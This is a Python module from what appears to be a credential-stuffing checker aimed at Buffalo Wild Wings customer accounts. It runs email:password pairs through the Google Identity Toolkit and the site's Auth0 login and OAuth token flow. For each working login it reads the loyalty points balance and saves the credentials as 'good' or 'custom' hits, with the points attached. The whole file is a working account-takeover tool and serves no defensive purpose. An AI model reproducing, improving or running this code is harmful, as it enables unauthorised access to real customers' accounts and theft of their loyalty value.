from modules.variables import Checker
from requests import Session
from modules.functions import log,save
from urllib.parse import urlparse, parse_qs, quote
from bs4 import BeautifulSoup as soup
from requests.adapters import HTTPAdapter, Retry
import json, functools

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                r = s.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCOwJXQgucG-msfcDWV-qJdRSZz7uDGZNk",json={'email':email,'password':password,'returnSecureToken':False})
                if r.status_code == 400:
                    Checker.bad += 1
                    return
                elif r.status_code != 200:
                    raise
                
                r = s.get('https://login.buffalowildwings.com/authorize?client_id=mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG&redirect_uri=https%3A%2F%2Fwww.buffalowildwings.com%2Fcallback&scope=openid%20offline_access&response_type=code&response_mode=query',headers={'Connection':'close'})
                csrf = r.cookies.get('_csrf')
                state = parse_qs(urlparse(r.url).query).get('state')
                if state: state = state[0]
                else: raise

                r = s.post('https://login.buffalowildwings.com/usernamepassword/login',json={"client_id":"mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG","redirect_uri":"https://www.buffalowildwings.com/callback","tenant":"bww-prd01","response_type":"code","scope":"openid offline_access","_csrf":csrf,"state":state,"_intstate":"deprecated","nonce":"Y3JuajNDSHhUYjdFSFdXZ083ME16OWRIRlJaRVhEbFRITV9iUmJaamdyeg==","password":password,"connection":"firebase-auth","username":email})
                if "invalid_user_password" in r.text:
                    Checker.bad += 1
                    return
                elif "This login attempt has been blocked because the password you're using was previously disclosed through a data breach" in r.text:
                    if not Checker.cui: log("custom",':'.join([email,password]),"BWW")
                    save("Buffalo Wild Wings","custom",Checker.time,':'.join([email,password]))
                    Checker.custom += 1
                    return
                elif "wresult" not in r.text:
                    raise
                
                sid = r.text.split('sid&#34;:&#34;')[1].split('&#34;,&#34;realm')[0]
                wc = quote(json.dumps({"strategy":"auth0","auth0Client":"eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTYuNCJ9","tenant":"bww-prd01","connection":"firebase-auth","client_id":"mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG","response_type":"code","scope":"openid offline_access","redirect_uri":"https://www.buffalowildwings.com/callback","state":state,"sid":sid,"realm":"firebase-auth"}))
                tk = soup(r.text, 'html.parser').find('input',{'name':'wresult'})['value']
                
                r = s.post('https://login.buffalowildwings.com/login/callback',data=f'wa=wsignin1.0&wresult={tk}&wctx={wc}',headers={'Content-Type':'application/x-www-form-urlencoded'})
                code = parse_qs(urlparse(r.url).query).get('code')
                if code: code = code[0]
                else: raise

                r = s.post('https://login.buffalowildwings.com/oauth/token',json={"client_id":"mLLAi6nx8PX5OykSkTBG79aw5SkfIdKG","code_verifier":"bS8VJhKbm8cvgVG4XDuDgOq.ODCEb6EnRp9UrXepbIc","grant_type":"authorization_code","code":code,"redirect_uri":"https://www.buffalowildwings.com/callback"})
                tk = r.json().get('id_token')

                r = s.get('https://api-idp.buffalowildwings.com/bww/web-exp-api/v1/customer/account/loyalty?sellingChannel=WEBOA',headers={'Authorization':f'Bearer {tk}'})
                points = r.json()['pointsBalance']

                if points < 0:
                    if not Checker.cui: log("custom",':'.join([email,password]),"BWW")
                    save("Buffalo Wild Wings","custom",Checker.time,':'.join([email,password])+f' | Points: {points}')
                    Checker.custom += 1
                    return
                
                if not Checker.cui: log("good",':'.join([email,password]),"BWW")
                save("Buffalo Wild Wings","good",Checker.time,':'.join([email,password])+f' | Points: {points}')
                Checker.good += 1
                return
                
        except:
            Checker.errors += 1
        
        